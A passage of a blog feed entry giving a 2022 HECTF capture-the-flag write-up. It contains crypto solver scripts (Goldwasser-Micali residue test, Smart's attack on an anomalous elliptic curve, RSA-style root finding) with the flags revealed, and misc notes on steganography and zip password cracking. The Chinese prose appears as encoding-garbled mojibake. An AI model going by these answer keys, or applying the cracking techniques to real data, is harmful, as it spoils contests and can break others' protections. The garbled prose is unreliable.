about whether you can still use rsa to solve problems&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x ^ e1 - c1</span><br><span class="line">x = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">flag= <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="onebit"><a href="#onebit" class="headerlink" title="onebit"></a>onebit</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Le</span>(<span class="params">n, p</span>):</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">message, n, g</span>):</span></span><br><span class="line"> ciphertext = []</span><br><span class="line"> <span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(message):</span><br><span class="line">     k = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">     c = ((g**<span class="built_in">int</span>(m)) * (k ** <span class="number">2</span>)) % n</span><br><span class="line">     ciphertext.append(c)</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> g = getPrime(<span class="number">512</span>)</span><br><span class="line"> <span class="keyword">if</span> Le(g, p) == p-<span class="number">1</span> <span class="keyword">and</span> Le(g, q) == q-<span class="number">1</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = Encrypt(m, n, g)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(p)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(g)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>åŠ å¯†ç»“æœ $c=g^mk^2$ï¼Œç¬¦åˆGMåŒæ€åŠ å¯†ç³»ç»Ÿï¼Œåˆ†åˆ«åˆ¤æ–­ $c_i$ æ˜¯å¦ä¸ºåŸºäºæ¨¡ $p$ çš„äºŒæ¬¡å‰©ä½™å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517</span></span><br><span class="line">g = <span class="number">8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cipher = <span class="built_in">int</span>(k)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher,p) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">text</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_key</span>(<span class="params">key</span>):</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line"><span class="comment">#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span></span><br></pre></td></tr></table></figure></blockquote><p>ECC+AESã€‚</p><p>ECCæ»¡è¶³ $P.\text{order}()=p$ï¼Œåˆ©ç”¨Smartâ€™s Attackè§£ $k$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">235322474717419</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q = E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SmartAttack</span>(<span class="params">P,Q,p</span>):</span></span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 152675955744921</span></span><br></pre></td></tr></table></figure><p>å†ä»£å…¥è¿˜åŸAESè§£å¯†å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc_text_b64 = <span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">enc_text = base64.b64decode(enc_text_b64)</span><br><span class="line">plain_text = aes.decrypt(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="xyz"><a href="#xyz" class="headerlink" title="xyz"></a>xyz</h3><p>ç”±äºç´ æ•° $x \in (2^{11},2^{12})$ï¼Œçˆ†ç ´ $x$ ï¼Œå†è§£å…³äº $y,z$ çš„äºŒå…ƒä¸€æ¬¡æ¨¡æ–¹ç¨‹ç»„ï¼Œæ ¹æ®å¼2å°† $z$ ä»£å…¥å¼1ï¼Œå¾—åˆ°å…³äº $y$ çš„æ¨¡æ–¹ç¨‹ï¼Œçˆ†ç ´æ±‚è§£ $m_1.m_2$ï¼Œç›´åˆ°å¾—åˆ°æ»¡è¶³flagæ ¼å¼çš„å€¼å³è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791</span></span><br><span class="line">a = <span class="number">76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579</span></span><br><span class="line">b = <span class="number">29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span> i.bit_length()==<span class="number">12</span> <span class="keyword">and</span> gmpy2.is_prime(i):</span><br><span class="line">s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ey = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    z = (b - x^<span class="number">12</span> - y^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)</span><br><span class="line">    g = (<span class="number">12</span> * x + <span class="number">12</span> * y + y * z + x * z ** <span class="number">12</span>) - a</span><br><span class="line">    roots = g.monic().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">            ee = x</span><br><span class="line">            yy = k[<span class="number">0</span>]</span><br><span class="line">            zz = (b - x^<span class="number">12</span> - yy^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)%p</span><br><span class="line">            d = inverse_mod(ee, p-<span class="number">1</span>)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(yy, d, p)</span><br><span class="line">            m2 = <span class="built_in">pow</span>(zz, d, p)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;48454354467b&#x27;</span> <span class="keyword">in</span> <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]+<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># 3989</span></span><br><span class="line"><span class="comment"># HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å’¦-å°é²¨é±¼æ¥å–½"><a href="#å’¦-å°é²¨é±¼æ¥å–½" class="headerlink" title="å’¦~å°é²¨é±¼æ¥å–½"></a>å’¦~å°é²¨é±¼æ¥å–½</h3><p>wiresharkæ‰“å¼€æµé‡æ–‡ä»¶ï¼Œé€ä¸ªæµæŸ¥çœ‹ï¼Œä¸€çœ¼æ‰¾åˆ°flagã€‚</p><p>â€‹    </p><h3 id="æ¥ç©æ‰è¿·è—å‘€"><a href="#æ¥ç©æ‰è¿·è—å‘€" class="headerlink" title="æ¥ç©æ‰è¿·è—å‘€"></a>æ¥ç©æ‰è¿·è—å‘€</h3><blockquote><p>ä½ èƒ½å¯»æ‰¾åˆ°çœŸæ­£çš„æˆ‘å—ï¼Ÿ</p></blockquote><p>pngå›¾ç‰‡æœ‰lsbéšå†™ï¼Œzstegæå–å‡ºå†…å®¹ï¼š <code>zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt</code>ï¼Œ</p><p>å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸²è½¬stringï¼Œå†xor 0x33å‘ç°zipå‹ç¼©åŒ…å¤´ï¼Œæå–å‡ºzipå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°flag.docï¼Œå°†æ–‡å­—å…¨é€‰è®¾ç½®é¢œè‰²ï¼Œå‘ç°flagï¼š<code>HECTF&#123;hah0ha_Find-Me!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä½ æŠŠæˆ‘flagè—å“ªå»äº†"><a href="#ä½ æŠŠæˆ‘flagè—å“ªå»äº†" class="headerlink" title="ä½ æŠŠæˆ‘flagè—å“ªå»äº†?"></a>ä½ æŠŠæˆ‘flagè—å“ªå»äº†?</h3><p>flag.docxä¸­æ‰“å¼€éšè—æ–‡å­—ï¼Œå¾—åˆ°çš„base64è§£ç å¾—ç¬¬ä¸€æ®µå­—ç¬¦ä¸²ï¼š</p><p><code>kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky</code></p><p>otherflag.txtä¸­å«æœ‰é›¶å®½å­—ç¬¦ï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™æå–å‡ºç¬¬äºŒæ®µå­—ç¬¦ä¸²ï¼š</p><p><code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>çœ‹å­—ç¬¦ä¸²æ— è§„å¾‹ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦é¢‘ç‡ç»Ÿè®¡ï¼Œæ‰¾ä¸€ä¸ª<a href="https://uutool.cn/str-statistics/">åœ¨çº¿å·¥å…·</a>ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•°ï¼ŒæŒ‰ç»“æœä»å¤§åˆ°å°æ’åºå–å‡ºå¯¹åº”å­—ç¬¦ä¸º <code>flagkpomijnhuybrvdxezswq&#123;&#125;</code>ï¼Œè°ƒæ•´æ‹¬å·ä½ç½®å³ä¸ºflagï¼š<code>flag&#123;kpomijnhuybrvdxezswq&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"><a href="#æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£" class="headerlink" title="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"></a>æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£</h3><p>å›¾ç‰‡å†…æ–‡å­—ç”¨åœ¨çº¿OCRè¯†åˆ«è½¬æ–‡å­—ï¼Œhexè½¬å­—ç¬¦ï¼Œæ ¹æ®æ–‡ä»¶å¤´è½¬å­˜ä¸ºzipå‹ç¼©åŒ…ï¼Œä½¿ç”¨ARCHPRçˆ†ç ´å‡ºå¯†ç 8686ï¼Œè§£å‹å¾—åˆ°txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åœ¨çº¿è§£å¯†å·¥å…·</a>è§£å¯†å¾—åˆ°flagï¼š<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="2022HECTFè°ƒæŸ¥é—®å·"><a href="#2022HECTFè°ƒæŸ¥é—®å·" class="headerlink" title="2022HECTFè°ƒæŸ¥é—®å·"></a>2022HECTFè°ƒæŸ¥é—®å·</h3><p>å†™é—®å·å¾—flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;2022HECTFæ˜¯ç”±æ²³åŒ—å¸ˆèŒƒå¤§å­¦SourceCodeæˆ˜é˜Ÿç»„ç»‡çš„é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„CTFç«æŠ€æ´»åŠ¨ï¼Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦è®¡ç®—æœºä¸ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ä¸»åŠï¼Œæ²³åŒ—çœç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤å’Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦ä¿¡æ¯å®‰å…¨åä¼šæ‰¿åŠï¼Œæ˜¯é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„ä¸€æ¬¡ç«æŠ€æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2022-09-04T05:46:20.000Z</published>
    <updated>2022-09-04T13:50:35.327Z</updated>
    
